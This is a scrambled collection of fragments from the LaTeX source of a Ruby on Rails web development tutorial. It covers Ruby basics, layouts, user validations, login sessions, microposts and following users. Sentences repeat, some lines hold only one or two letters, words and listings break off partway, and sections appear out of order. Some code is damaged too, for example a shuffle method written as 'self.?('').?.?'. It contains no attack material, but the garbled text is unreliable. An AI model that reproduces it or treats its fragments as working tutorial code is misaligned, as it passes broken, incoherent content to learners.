Listing~\ref{code:valid_user_test} uses the plain \kode{assert} method, which in this case succeeds if \kode{@user.valid?}\ returns \kode{true} and fails if it returns \kode{false}.
in Listing~\ref{code:users_migration}.
DELETE
Listing~\ref{code:valid_user_test} uses the plain \kode{assert} method, which in this case succeeds if \kode{@user.valid?}\ returns \kode{true} and fails if it returns \kode{false}.
Because we won't need fixtures until Chapter~\ref{cha:basic_login}, for now we'll just remove them, leaving an empty fixtures file (Listing~\ref{code:empty_fixtures}).
(Writing a test for email downcasing is left as an exercise (Section~\ref{sec:exercises_uniqueness_validation}).)
We'll also add a way to \emph{authenticate} a user based on a given password, a method we'll use in Chapter~\ref{cha:basic_login} to allow users to log in to the site.
Because we won't need fixtures until Chapter~\ref{cha:basic_login}, for now we'll just remove them, leaving an empty fixtures file (Listing~\ref{code:empty_fixtures}).
In Chapter~\ref{cha:basic_login}, we'll use the \kode{authenticate} method to sign registered users into our site.
(Writing a test for email downcasing is left as an exercise (Section~\ref{sec:exercises_uniqueness_validation}).)
In Chapter~\ref{cha:basic_login}, we'll then use the authentication machinery from Section~\ref{sec:adding_a_secure_password} to let users log into the site.
We'll also add a way to \emph{authenticate} a user based on a given password, a method we'll use in Chapter~\ref{cha:basic_login} to allow users to log in to the site.
\chapter{Filling in the layout} % (fold)<n>\label{cha:filling_in_the_layout}<n><n>In the process of taking a brief tour of Ruby in Chapter~\ref{cha:rails_flavored_ruby}, we learned about including the application stylesheet into the sample application (Section~\ref{sec:motivation}), but (as noted in Section~\ref{sec:css_revisited}) the stylesheet doesn't yet contain any CSS\@. In this chapter, we'll start filling in the custom stylesheet by incorporating a CSS framework into our application, and then we'll add some custom styles of our own.\footnote{
<n><n>%= lang:console<n>\begin{code}<n>$ git checkout -b filling-in-layout<n>\end{code}<n><n>    \subsection{Site navigation} % (fold)<n>    \label{sec:adding_to_the_layout}<n><n>As a first step toward adding links and styles to the sample application, we'll 
in Listing~\ref{code:rails_default_head}.
Once you've placed your assets in their logical locations, you can use \emph{manifest files} to tell Rails (via the \href{https://github.com/rails/sprockets}{Sprockets} gem) how to combine them to form single files.
The line
(We'll make the last one in Chapter~\ref{cha:basic_login}.)
In this case, these routes are \kode{root\_path} and \kode{root\_url}, with the only difference being that the latter includes the full URL:
as shown in Listing~\ref{code:static_page_routes_test}.
in Listing~\ref{code:static_page_routes_test}.
as shown in Listing~\ref{code:users_controller_test_signup_route}.
Adding a test for the signup page is left as an exercise (Section~\ref{sec:exercises_rails_routes}.)
With that, we're done with the links and named routes, at least until we add a route for logging in (Chapter~\ref{cha:basic_login}).
in Listing~\ref{code:layout_links_test_signup_full_title_helper}.
A model of followed users through active relationships.
rails-flavored-ruby
It's packed (perhaps even \emph{too} packed) with information; for example, to learn more about Ruby strings you can look at the Ruby API entry for the \kode{String} class.
(The alert reader might notice at this point that the second \kode{return} here is actually unnecessary---being the last expression in the function, the string \kode{"The string is nonempty."}\ will be returned regardless of the \kode{return} keyword, but using \kode{return} in both places has a pleasing symmetry to it.)
in Listing~\ref{code:palindrome_if}.
from Listing~\ref{code:palindrome_tester} to
This creates ``getter'' and ``setter'' methods that allow us to retrieve (get) and assign (set) \kode{@name} and \kode{@email} \emph{instance variables}, which were mentioned briefly in Section~\ref{sec:mvc_in_action} and Section~\ref{sec:exercises_adding_page_titles}.
<n>\end{code}<n><n><n>\subsection{What we learned in this chapter} % (fold)<n>\label{sec:rails_flavored_ruby_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
\chapter{Mostly static pages}<n>\label{cha:static_pages}<n><n>
in Listing~\ref{code:sample_app_readme}.
This is the sample application for
Learn Web Development with Rails
in Listing~\ref{code:hello_action_redux_2} and
With these techniques in hand, we are well-equipped to recover from the inevitable development \href{https://en.wiktionary.org/wiki/SNAFU}{snafus}.
The hypertext transfer protocol (\href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods}{HTTP}) defines the basic operations \texttt{GET}, \texttt{POST}, \texttt{PATCH}, and \texttt{DELETE}.
in Listing~\ref{code:raw_home_view} and
 This means we can begin customizing the Home and Help pages even with no knowledge of Rails, as shown in Listing~\ref{code:custom_home_page} and Listing~\ref{code:custom_help_page}.
\label{fig:custom_help_page}}<n>\end{figure}<n><n>% subsection custom_static_pages (end)<n><n>  % section static_pages (end)<n><n><n>  \section{Getting started with testing} % (fold)<n>  \label{sec:getting_started_with_testing}<n><n>
The action 'about' could not be found for StaticPagesController
/tmp
As a bonus, by using base64 strings specifically designed to be safe in URLs (as indicated by the name \kode{urlsafe\_base64}), we'll be able to use the same token generator to make account activation and password reset links in Chapter~\ref{cha:password_reset}.
<n>  >> 1.year.from_now
<n>  >> 10.weeks.ago
The above discussion suggests putting the digest--token comparison into an \kode{authenticated?}
(Although the \kode{authenticated?}\ method in Listing~\ref{code:authenticated_p} is tied specifically to the remember digest, it will turn out to be useful in other contexts as well, and we'll generalize it in Chapter~\ref{cha:account_activation}.)
in Listing~\ref{code:destroy_forget} and
in Listing~\ref{code:authenticated_p_fixed} and
in Listing~\ref{code:log_in_function}.
in Listing~\ref{code:test_helper_log_in}.
Fixing this minor blemish is left as an exercise (Section~\ref{sec:exercises_testing_the_remember_me_box}), but for now we can just test to see if the relevant cookie is \kode{nil} or not.
in Listing~\ref{code:remember_me_test}.
Moreover, persistent sessions are cumbersome to check by hand, so if we ever want to refactor the \kode{current\_user} method (as we will in Chapter~\ref{cha:account_activation}) it's important to test it.
instead, and it would work just the same, but (as mentioned briefly in Section~\ref{sec:exercises_layout_link_tests}) the conventional order for the arguments to \kode{assert\_equal} is \emph{expected}, \emph{actual}:
The Relationship data model.
A summary of user/active relationship association methods.
Testing the Relationship model validations.
in Listing~\ref{code:signup_form}.
A model for user followers through passive relationships.
A mockup of the stats partial.
RESTful routes provided by the custom rules in resource in Listing~\ref{code:following_followers_actions_routes}.
The Home page with follow stats.
We accomplish this with the \kode{hidden\_field\_tag} method in Listing~\ref{code:follow_form}, which produces HTML of the form
A user profile with an unfollow button (\href{http://localhost:3000/users/5}{/users/5}).
A mockup of the user following page.
A mockup of the user followers page.
Showing the users the given user is following.
Showing the given user's followers.
Showing a different user's followers.
A mockup of a user's Home page with a status feed.
The feed for a user (id 1) following users with ids 2, 7, 8, and 10.
Converting these requirements to assertions and recalling that the \kode{feed} is in the User model (Listing~\ref{code:proto_status_feed}) gives the updated User model test shown in Listing~\ref{code:full_feed_test}.
In Chapter~\ref{cha:user_microposts}, the result was only a proto-feed (Figure~\ref{fig:home_with_proto_feed}), but with the implementation in Listing~\ref{code:feed_final} as seen in Figure~\ref{fig:home_page_with_feed} the Home page now shows the full feed.
The Home page with a working status feed.
A working status feed on the live Web.
Testing the feed HTML. 
r
a
f
 p
), the 
 I
n addition to
ocusing
on general principles of web development (rather than on Rails specificall
technical sophistication
which is 
incipal th
In particular, the Learn Enough introductory sequence consists of a series of tutorials that are suitable as prerequisites to the
, starting
ith
Technical sophistication
Because web applications have so many moving parts, they offer ample opportunities to develop your technical sophistication.
 custom_helpers (end)<n><n>  % section motivation (end)<n><n>  \section{Strings and methods} % (fold)<n>  \label{sec:strings_and_methods}<n><n>
{puts}) a string consisting of the city and state separated by a comma and as space, as in ``Los Angeles, CA''.<n>%= <span class='exercise' id='ex-768a74'></span><n><n>  \item Repeat the previous exercise but with the city and state separated by a tab character.<n>%= <span class='exercise' id='ex-54fc65'></span><n><n>  \item What is the result if you replace double quotes with single quotes in the previous exercise?<n>%= <span class='exercise' id='ex-4820a5'></span><n>\end{enumerate}<n><n>      \subsection{Objects and message passing} % (fold)<n>      \label{sec:objects_and_message_passing}<n><n>
{code:palindrome_if}? How does it change if you reassign the variable~\kode{s} to the string ``\href{http://www.dictionary.com/browse/onomatopoeia}{onomatopoeia}''? \emph{Hint}: Use up-arrow to retrieve and edit previous commands<n>%= <span class='exercise' id='ex-519870'></span><n>\end{enumerate}<n><n>\begin{codelisting}<n>\label{code:palindrome_if}<n>\codecaption{A simple palindrome test.}<n>%= lang:irb<n>\begin{code}<n>>> puts "It's a palindrome!" if s == s.reverse<n>\end{code}<n>\end{codelisting}<n><n>      \subsection{Method definitions} % (fold)<n>      \label{sec:method_definitions}<n><n>
{enumerate}<n><n>\begin{codelisting}<n>\label{code:palindrome_tester}<n>\codecaption{A simple tester for palindromes.}<n>%= lang:irb<n>\begin{code}<n>>> def palindrome_tester(s)<n>>>   if FILL_IN<n>>>     puts "It's a palindrome!"<n>>>   else<n>>>     puts "It's not a palindrome."<n>>>   end<n>>> end<n>\end{code}<n>\end{codelisting}<n><n>    \subsection{Back to the title helper} % (fold)<n>    \label{sec:back_to_the_title_helper}<n><n>We are now in a position to understand the \kode{full\_title} helper from Listing~\ref{code:title_helper},\footnote{
{a} through \kode{z}? What about the same range reversed? \emph{Hint}: In both cases you will have to convert the range to an array.<n>%= <span class='exercise' id='ex-5e13ce'></span><n>\end{enumerate}<n><n>    \subsection{Blocks} % (fold)<n>    \label{sec:blocks}<n><n>
ection blocks (end)<n><n><n>    % subsection arrays_and_ranges (end)<n><n>    \subsection{Hashes and symbols} % (fold)<n>    \label{sec:hashes_and_symbols}<n><n>
s the value of the following expression?<n>%= <span class='exercise' id='ex-bc0dd6'></span><n><n>  %= lang:ruby<n>  \begin{code}<n>  { "a" => 100, "b" => 200 }.merge({ "b" => 300 })<n>  \end{code}<n>\end{enumerate}<n><n>    % subsection hashes_and_symbols (end)<n><n>    \subsection{CSS revisited} % (fold)<n>    \label{sec:css_revisited}<n><n>
 % subsection css_revisited (end)<n><n>  % section other_data_structures (end)<n><n>  \section{Ruby classes} % (fold)<n>  \label{sec:ruby_classes}<n><n>
uctor using the \kode{Range} class and the \kode{new} method? \emph{Hint}: \kode{new} takes two arguments in this context.<n>%= <span class='exercise' id='ex-73158e'></span><n><n>  \item Confirm using the \kode{==} operator that the literal and named constructors from the previous two exercises are identical.<n>%= <span class='exercise' id='ex-4d8c3d'></span><n><n>\end{enumerate}<n><n>    % subsection constructors (end)<n><n>    \subsection{Class inheritance} % (fold)<n>    \label{sec:a_class_of_our_own}<n><n>
end{enumerate}<n><n>    % subsection a_class_of_our_own (end)<n><n>    \subsection{Modifying built-in classes} % (fold)<n>    \label{sec:modifying_built_in_classes}<n><n>
f shuffle<n>>>     self.?('').?.?<n>>>   end<n>>> end<n>>> "foobar".shuffle<n>=> "borafo"<n>\end{code}<n>\end{codelisting}<n>    % subsection modifying_built_in_classes (end)<n><n>      \subsection{A controller class} % (fold)<n>      \label{sec:a_controller_class}<n><n>
te}<n><n>      % subsection a_controller_class (end)<n><n><n>    \subsection{A user class} % (fold)<n>    \label{sec:a_user_class}<n><n>
ection a_user_object (end)<n><n>  % section ruby_classes (end)<n><n>  \section{Conclusion} % (fold)<n>  \label{sec:conclusion}<n><n>
}}<n>\end{figure}<n><n>    % subsection header (end)<n><n>    \subsection{Bootstrap and custom CSS} % (fold)<n>    \label{sec:custom_css}<n><n>
 to hide all images.}<n>%= lang:css<n>\begin{code}<n>img {<n>  display: none;<n>}<n>\end{code}<n>\end{codelisting}<n><n><n>    % subsection custom_css (end)<n><n>    \subsection{Partials} % (fold)<n>    \label{sec:partials}<n><n>
nder 'layouts/rails_default' %><n>    <%= render 'layouts/shim' %><n>  </head><n>  <body><n>    <%= render 'layouts/header' %><n>    <div class="container"><n>      <%= yield %><n>      <%= render 'layouts/footer' %><n>    </div><n>  </body><n></html><n>\end{code}<n>\end{codelisting}<n><n>    % subsection partials (end)<n><n>  % section header_and_menu (end)<n><n>  \section{Sass and the asset pipeline} % (fold)<n>  \label{sec:sass_and_the_asset_pipeline}<n><n>
<n><n>    \subsection{The asset pipeline} % (fold)<n>    \label{sec:the_asset_pipeline}<n><n>F
te}<n><n>  % section sass_and_the_asset_pipeline (end)<n><n>  \section{Layout links} % (fold)<n>  \label{sec:layout_links}<n><n>Now that we've finished a site layout with decent styling, it's time to start filling in the links we've stubbed out with \kode{'\#'}. 
 to: 'static_pages#contact'<n>end<n>\end{code}<n>\end{codelisting}<n><n>    % subsection rails_routes (end)<n><n>    \subsection{Using named routes} % (fold)<n>    \label{sec:named_routes}<n><n>
e' id='ex-98fcd3'></span><n><n>\end{enumerate}<n><n>    % subsection named_routes (end)<n><n>\subsection{Layout link tests} % (fold)<n>\label{sec:layout_link_tests}<n><n>
d='ex-b87c82'></span><n>\end{enumerate}<n><n>    % subsection users_controller (end)<n><n>    \subsection{Signup URL} % (fold)<n>    \label{sec:signup_url}<n><n>
exercise' id='ex-cb38fe'></span><n>\end{enumerate}<n><n>    % subsection signup_url (end)<n><n>  % section user_signup (end)<n><n>  \section{Conclusion} % (fold)<n>  \label{sec:layout_conclusion}<n><n>
}<n><n><n>    % subsection database_migrations (end)<n><n>    \subsection{The model file} % (fold)<n>    \label{sec:the_model_file}<n><n>
umerate}<n><n>    % subsection the_model_file (end)<n><n>    \subsection{Creating user objects} % (fold)<n>    \label{sec:creating_user_objects}<n><n>
te}<n><n>    % subsection creating_user_objects (end)<n><n>    \subsection{Finding user objects} % (fold)<n>    \label{sec:finding_user_objects}<n><n>
_user_objects (end)<n><n>    \subsection{Updating user objects} % (fold)<n>    \label{sec:updating_user_objects}<n><n>
_user_objects (end)<n><n>  % section user_model (end)<n><n>  \section{User validations} % (fold)<n>  \label{sec:user_validations}<n><n>
te}<n><n>% subsection a_validity_test (end)<n><n>    \subsection{Validating presence} % (fold)<n>    \label{sec:presence_validation}<n><n>
n><n>\end{enumerate}<n><n>    \subsection{Length validation} % (fold)<n>    \label{sec:length_validation}<n><n>
umerate}<n><n>    % subsection length_validation (end)<n><n>    \subsection{Format validation} % (fold)<n>    \label{sec:format_validation}<n><n>
d<n>\end{code}<n>\end{codelisting}<n><n>      % subsection format_validation (end)<n><n>    \subsection{Uniqueness validation} % (fold)<n>    \label{sec:uniqueness_validation}<n><n>
 @user.reload.email<n>  end<n>end<n>\end{code}<n>\end{codelisting}<n><n>\begin{codelisting}<n>\label{code:downcase_bang}<n>\codecaption{An alternate callback implementation. \passing \\ \filepath{app/models/user.rb}}<n>%= lang:ruby, options: "hl_lines": [2]<n>\begin{code}<n>class User < ApplicationRecord<n>  before_save { email.downcase! }<n>  validates :name, presence: true, length: { maximum: 50 }<n>  VALID_EMAIL_REGEX = /\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i<n>  validates :email, presence: true, length: { maximum: 255 },<n>                    format: { with: VALID_EMAIL_REGEX },<n>                    uniqueness: { case_sensitive: false }<n>end<n>\end{code}<n>\end{codelisting}<n><n><n>    % subsection uniqueness_validation (end)<n><n>  % section model_validations (end)<n><n>  \section{Adding a secure password} % (fold)<n>  \label{sec:adding_a_secure_password}<n><n>
te}<n><n>    % subsection creating_and_authenticating_a_user (end)<n><n>  % section adding_a_secure_password (end)<n><n>  \section{Conclusion}<n>  \label{sec:modeling_users_conclusion}<n><n>
ohtTEcH..."><n>\end{code}<n><n>\subsection{What we learned in this chapter} % (fold)<n>\label{sec:modeling_users_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n>\item 
As implied by their generic names, the applications developed in the \emph{Ruby on Rails Tutorial} are not specific to any particular kind of website.
it.<n><n>    \subsection{Development environment}<n>    \label{sec:development_environment}<n><n>
\label{fig:cloud9_two_spaces}}<n>\end{figure}<n><n>\subsection{Installing Rails} % (fold)<n>\label{sec:installing_rails}<n><n>The development environment from Section~\ref{sec:development_environment} includes all the software we need to get started except for Rails itself.
 getting results consistent with this tutorial.<n><n>% subsection installing_rails (end)<n><n>    \section{The first application}<n>    \label{sec:the_hello_application}<n><n>Following a \href{http://www.catb.org/jargon/html/H/hello-world.html}{long tradition} in computer programming, our goal for the first application is to write a ``
d='ex-ce3907'></span><n>\end{enumerate}<n><n>\begin{figure}<n>\begin{center}<n>\image{images/figures/hola_mundo.png}<n>\end{center}<n>\caption{Changing the root route to return ``¡Hola, mundo!''.\label{fig:hola_mundo}}<n>\end{figure}<n><n>\begin{figure}<n>\begin{center}<n>\image{images/figures/goodbye_world.png}<n>\end{center}<n>\caption{Changing the root route to return ``goodbye, world!''.\label{fig:goodbye_world}}<n>\end{figure}<n><n>% subsection hello_world (end)<n><n>  % section up_and_running (end)<n><n>  \section{Version control with Git} % (fold)<n>  \label{sec:version_control}<n><n>
<n><n>    \subsection{What good does Git do you?}<n>    \label{sec:what_good_does_git_do_you}<n><n>If you've never used version control before, it may not be entirely clear at this point what good it does you, so let me give just one example.
<n><n>    \subsection{Heroku deployment, step two}<n>    \label{sec:heroku_step_two}<n><n>There is no step two!
te}<n><n>    \subsection{Heroku commands}<n>    \label{sec:heroku_commands}<n><n>
on deploying (end)<n><n>  \section{Conclusion} % (fold)<n>  \label{sec:beginning_conclusion}<n><n>
ide the IDE itself.)<n><n>    \subsection{A user tour} % (fold)<n>    \label{sec:a_user_tour}<n><n>
alid email address, like ``@example.com''?<n>%= <span class='exercise' id='ex-6accd1'></span><n><n>  \item Destroy each of the users created in the previous exercises. Does Rails display a message by default when a user is destroyed?<n>%= <span class='exercise' id='ex-abc7bd'></span><n>\end{enumerate}<n><n>    % subsection a_user_tour (end)<n><n>    \subsection{MVC in action} % (fold)<n>    \label{sec:mvc_in_action}<n><n>
merate}<n><n>    % subsection mvc_in_action (end)<n><n>    \subsection{Weaknesses of this Users resource} % (fold)<n>    \label{sec:weaknesses_of_this_users_resource}<n><n>
  validates FILL_IN, presence: true    # Replace FILL_IN with the right code.<n>  validates FILL_IN, presence: true    # Replace FILL_IN with the right code.<n>end<n>\end{code}<n>\end{codelisting}<n><n>\begin{figure}<n>\begin{center}<n>\image{images/figures/user_presence_validations.png}<n>\end{center}<n>\caption{The effect of presence validations on the User model.\label{fig:user_presence_validations}}<n>\end{figure}<n><n>    % subsection demo_user_has_many_microposts (end)<n><n>    \subsection{Inheritance hierarchies} % (fold)<n>    \label{sec:inheritance_hierarchies}<n><n>
te}<n><n>    % subsection inheritance_hierarchies (end)<n><n>    \subsection{Deploying the toy app} % (fold)<n>    \label{sec:deploying_the_toy_app}<n><n>
{code:demo_length_validation} works on the production app.<n>%= <span class='exercise' id='ex-debcc6'></span><n>\end{enumerate}<n><n>  \section{Conclusion} % (fold)<n>  \label{sec:toy_app_conclusion}<n><n>
_app_setup (end)<n><n>  \section{Static pages} % (fold)<n>  \label{sec:static_pages}<n><n>
 <span class='exercise' id='ex-b6b114'></span><n>\end{enumerate}<n><n>% subsection generated_static_pages (end)<n><n>\subsection{Custom static pages} % (fold)<n>\label{sec:custom_static_pages}<n><n>
<n>\end{code}<n>\end{codelisting}<n><n><n>    % subsection testing_titles (end)<n><n>    \subsection{Adding page titles (Green)} % (fold)<n>    \label{sec:adding_page_titles}<n><n>
\end{code}<n>\end{codelisting}<n><n>    % subsection adding_page_titles (end)<n><n>    \subsection{Layouts and embedded Ruby (Refactor)} % (fold)<n>    \label{sec:layouts_and_embedded_ruby}<n><n>
d{code}<n>\end{codelisting}<n><n><n>\subsection{Setting the root route} % (fold)<n>\label{sec:setting_the_root_route}<n><n>
}<n><n>% subsection setting_the_root_route (end)<n><n>  % section slightly_dynamic_pages (end)<n><n>  \section{Conclusion} % (fold)<n>  \label{sec:static_pages_conclusion}<n><n>Seen from the outside, this chapter hardly accomplished anything: we started with static pages, and ended with\ldots\ \emph{mostly} static pages. 
\subsection{Backtrace silencer} % (fold)<n>%
   % subsection backtrace_silencer (end)<n><n>  \subsection{Automated tests with Guard} % (fold)<n>  \label{sec:guard}<n><n>
-b updating-users<n>\end{code}<n><n>    \subsection{Edit form} % (fold)<n>    \label{sec:edit_form}<n><n>We start with the edit form, whose mockup appears in Figure~\ref{fig:edit_user_mockup}.\footnote{Image retrieved 
umerate}<n><n>    % subsection unsuccessful_edits (end)<n><n>    \subsection{Testing unsuccessful edits} % (fold)<n>    \label{sec:testing_unsuccessful_edits}<n><n>
g the text ``The form contains 4 errors.''<n>%= <span class='exercise' id='ex-faa5fa'></span><n>\end{enumerate}<n><n>    % subsection testing_unsuccessful_edits (end)<n><n>    \subsection{Successful edits (with TDD)} % (fold)<n>    \label{sec:successful_edits}<n><n>
u change the email address to one without an associated Gravatar?<n>%= <span class='exercise' id='ex-05aa0f'></span><n>\end{enumerate}<n><n>    % subsection enabling_edits (end)<n><n>  % section updating_users (end)<n><n>  \section{Authorization} % (fold)<n>  \label{sec:authorization}<n><n>
umerate}<n><n>    % subsection requiring_logged_in_users (end)<n><n>    \subsection{Requiring the right user} % (fold)<n>    \label{sec:requiring_the_right_user}<n><n>
te}<n><n>    % subsection requiring_the_right_user (end)<n><n>    \subsection{Friendly forwarding} % (fold)<n>    \label{sec:friendly_forwarding}<n><n>
<n>\end{enumerate}<n><n>    % subsection friendly_forwarding (end)<n><n>  % section protecting_pages (end)<n><n>  \section{Showing all users} % (fold)<n>  \label{sec:showing_all_users}<n><n>
umerate}<n><n>    % subsection user_index (end)<n><n>    \subsection{Sample users} % (fold)<n>    \label{sec:sample_users}<n><n>
umerate}<n><n>    % subsection sample_users (end)<n><n>    \subsection{Pagination} % (fold)<n>    \label{sec:pagination}<n><n>
<n><n>% subsection user_index_test (end)<n><n>    \subsection{Partial refactoring} % (fold)<n>    \label{sec:partial_refactoring}<n><n>
ting tests are \failing.<n>%= <span class='exercise' id='ex-d0d59d'></span><n>\end{enumerate}<n><n>    % subsection partial_refactoring (end)<n><n>  % section showing_users (end)<n><n>  \section{Deleting users} % (fold)<n>  \label{sec:deleting_users}<n><n>
<n><n>% subsection user_destroy_tests (end)<n><n>  % section deleting_users (end)<n><n>  \section{Conclusion} % (fold)<n>  \label{sec:updating_and_deleting_users_conclusion}<n><n>
      \subsection{Micropost validations} % (fold)<n>      \label{sec:micropost_validations}<n><n>
<n><n>\end{enumerate}<n><n>    % subsection micropost_validations (end)<n><n>    \subsection{User/Micropost associations} % (fold)<n>    \label{sec:user_micropost_associations}<n><n>
<n><n>\end{enumerate}<n><n>    % subsection user_micropost_associations (end)<n><n>    \subsection{Micropost refinements} % (fold)<n>    \label{sec:ordering_and_dependency}<n><n>
ing \kode{Micropost.find} that the user's first micropost was also destroyed.<n>%= <span class='exercise' id='ex-ec2e6b'></span><n><n>\end{enumerate}<n><n>    % subsection ordering_and_dependency (end)<n><n>  % section a_micropost_model (end)<n><n>  \section{Showing microposts} % (fold)<n>  \label{sec:showing_microposts}<n><n>
n class='exercise' id='ex-df8fbd'></span><n>\end{enumerate}<n><n>    % subsection rendering_microposts (end)<n><n>    \subsection{Sample microposts} % (fold)<n>    \label{sec:sample_microposts}<n><n>
exercise' id='ex-c6f975'></span><n>\end{enumerate}<n><n>    % subsection sample_microposts (end)<n><n>\subsection{Profile micropost tests} % (fold)<n>\label{sec:profile_micropost_tests}<n><n>
n><n>\end{enumerate}<n><n>% subsection profile_micropost_tests (end)<n><n>  % section showing_microposts (end)<n><n>  \section{Manipulating microposts} % (fold)<n>  \label{sec:manipulating_microposts}<n><n>
n><n>\end{enumerate}<n><n>    % subsection access_control (end)<n><n>    \subsection{Creating microposts} % (fold)<n>    \label{sec:creating_microposts}<n><n>
umerate}<n><n>    % subsection creating_microposts (end)<n><n>    \subsection{A proto-feed} % (fold)<n>    \label{sec:a_proto_feed}<n><n>
are all the same. \emph{Hint}: It's probably easiest to compare directly using \kode{==}.<n>%= <span class='exercise' id='ex-e4ef4b'></span><n>\end{enumerate}<n><n>    % subsection a_proto_feed (end)<n><n>    \subsection{Destroying microposts} % (fold)<n>    \label{sec:destroying_microposts}<n><n>
te}<n><n>    % subsection destroying_microposts (end)<n><n>\subsection{Micropost tests} % (fold)<n>\label{sec:micropost_tests}<n><n>
<n>    other_user = users(:malory)<n>    log_in_as(other_user)<n>    get root_path<n>    assert_match "0 microposts", response.body<n>    other_user.microposts.create!(content: "A micropost")<n>    get root_path<n>    assert_match FILL_IN, response.body<n>  end<n>end<n>\end{code}<n>\end{codelisting}<n><n>% subsection micropost_tests (end)<n><n>  % section manipulating_microposts (end)<n><n><n>  \section{Micropost images} % (fold)<n>  \label{sec:micropost_images}<n><n>
ubsection basic_image_upload (end)<n><n><n>\subsection{Image validation} % (fold)<n>\label{sec:image_validation}<n><n>
end{enumerate}<n><n>% subsection image_validation (end)<n><n>\subsection{Image resizing} % (fold)<n>\label{sec:image_resizing}<n><n>
sting}<n><n>\subsection{Image upload in production} % (fold)<n>\label{sec:image_upload_in_production}<n><n>
bsection image_upload_in_production (end)<n><n>  % section micropost_images (end)<n><n>  \section{Conclusion} % (fold)<n>  \label{sec:user_microposts_conclusion}<n><n>With the addition of the Microposts resource, we are nearly finished with our sample application.
\chapter{Following users}<n>\label{cha:following_users}<n><n>
<n>\end{enumerate}<n><n>    % subsection a_problem_with_the_data_model (end)<n><n>    \subsection{User/relationship associations} % (fold)<n>    \label{sec:relationship_user_associations}<n><n>
end{enumerate}<n><n>    % subsection relationship_user_associations (end)<n><n>    \subsection{Relationship validations} % (fold)<n>    \label{sec:relationship_validations}<n><n>
ge as of Rails~5, and in previous versions of Rails the validations are required. We'll plan to leave them in for completeness, but it's worth bearing in mind that you may see these validations omitted in other people's code.)<n>%= <span class='exercise' id='ex-0003a9'></span><n>\end{enumerate}<n><n>    % subsection relationship_validations (end)<n><n>    \subsection{Followed users} % (fold)<n>    \label{sec:following}<n><n>
ex-b4bbb0'></span><n><n>\end{enumerate}<n><n>    % subsection sample_following_data (end)<n><n>    \subsection{Stats and a follow form} % (fold)<n>    \label{sec:stats_and_a_follow_form}<n><n>
<n><n>    \subsection{A working follow button the standard way} % (fold)<n>    \label{sec:a_working_follow_button_the_standard_way}<n><n>
umerate}<n><n>    % subsection a_working_follow_button_the_standard_way (end)<n><n>    \subsection{A working follow button with Ajax} % (fold)<n>    \label{sec:a_working_follow_button_with_ajax}<n><n>
umerate}<n><n>    % subsection a_working_follow_button_with_ajax (end)<n><n>  \subsection{Following tests} % (fold)<n>  \label{sec:following_tests}<n><n>
in the previous exercise would catch it.<n>%= <span class='exercise' id='ex-90699b'></span><n><n>\end{enumerate}<n><n>  % subsection following_tests (end)<n><n>  % section a_web_interface_for_following_and_followers (end)<n><n>  \section{The status feed} % (fold)<n>  \label{sec:the_status_feed}<n><n>
n><n>\end{enumerate}<n><n>    % subsection motivation_and_strategy (end)<n><n>    \subsection{A first feed implementation} % (fold)<n>    \label{sec:a_first_feed_implementation}<n><n>With the status feed design requirements captured in the test from Listing \ref{code:full_feed_test}, we're ready to start writing the feed. 
_first_feed_implementation (end)<n><n>    \subsection{Subselects} % (fold)<n>    \label{sec:scopes_subselects_and_a_lambda}<n><n>
nd<n>  end<n>end<n>\end{code}<n>\end{codelisting}<n><n>    % subsection scopes_subselects_and_a_lambda (end)<n><n>  \section{Conclusion} % (fold)<n>  \label{sec:following_conclusion}<n><n>
 \emph{Hint}: Use \kode{user.reload} to retrieve the new value.<n>%= <span class='exercise' id='ex-140f50'></span><n><n>\end{enumerate}<n><n>% subsection updating_the_reset (end)<n><n>\subsection{Password reset test} % (fold)<n>\label{sec:password_reset_test}<n><n>
mail_in_production (end)<n><n>% section password_reset (end)<n><n>\section{Conclusion} % (fold)<n>\label{sec:resets_conclusion}<n><n>
<n><n>\section{Account activations resource} % (fold)<n>\label{sec:account_activations_resource}<n><n>
 (end)<n><n>\section{Activating the account} % (fold)<n>\label{sec:activating_the_account}<n><n>
n_edit_action (end)<n><n>% section activating_the_account (end)<n><n>\subsection{Activation test and refactoring} % (fold)<n>\label{sec:activation_test_and_refactoring}<n><n>
listing}<n><n>\subsection{Login with remembering} % (fold)<n>\label{sec:login_with_remembering}<n><n>
}<n><n>% subsection login_with_remembering (end)<n><n>\subsection{Forgetting users} % (fold)<n>\label{sec:forgetting_users}<n><n>
getting_users (end)<n><n>\subsection{Two subtle bugs} % (fold)<n>\label{sec:two_subtle_bugs}<n><n>
}<n><n>% subsection two_subtle_bugs (end)<n><n>\section{``Remember me'' checkbox} % (fold)<n>\label{sec:remember_me_checkbox}<n><n>
ection{Exercises}<n>\label{sec:exercises_remember_me}<n><n>\input{fragments/society_exercises_note}<n><n>\begin{enumerate}<n>  \item By inspecting your browser's cookies directly, verify that the ``remember me'' checkbox is having its intended effect.<n>%= <span class='exercise' id='ex-0c1e96'></span><n><n>  \item At the console, invent examples showing both possible behaviors of the ternary operator (Box~\ref{aside:ternary_operator}).<n>%= <span class='exercise' id='ex-63ac73'></span><n>\end{enumerate}<n><n>% section remember_me (end)<n><n>\section{Remember tests} % (fold)<n>\label{sec:remember_tests}<n><n>
  \section{Conclusion} % (fold)<n>  \label{sec:advanced_login_conclusion}<n><n>
<n><n>\subsection{What we learned in this chapter} % (fold)<n>\label{sec:advanced_
<n><n>  \section{Sessions}<n>  \label{sec:sessions_and_failed_login}<n><n>
in<n>\end{code}<n><n>    \subsection{Sessions controller} % (fold)<n>    \label{sec:sessions_controller}<n><n>
ults of \kode{rails routes} to \kode{grep}, list all the routes associated with the Users resource. Do the same for Sessions. How many routes does each resource have? \emph{Hint}: Refer to the \href{https://www.learnenough.com/command-line-tutorial#sec-grepping}{section on grep} in \lecl.<n>%= <span class='exercise' id='ex-061c5c'></span><n>\end{enumerate}<n><n>    % subsection sessions_controller (end)<n><n>  \subsection{Login form} % (fold)<n>  \label{sec:login_form}<n><n>
umerate}<n><n>    % subsection login_form (end)<n><n>    \subsection{Finding and authenticating a user} % (fold)<n>    \label{sec:finding_and_authenticating_a_user}<n><n>
umerate}<n><n>    % subsection finding_and_authenticating_a_user (end)<n><n>    \subsection{Rendering with a flash message} % (fold)<n>    \label{sec:rendering_with_a_flash_message}<n><n>
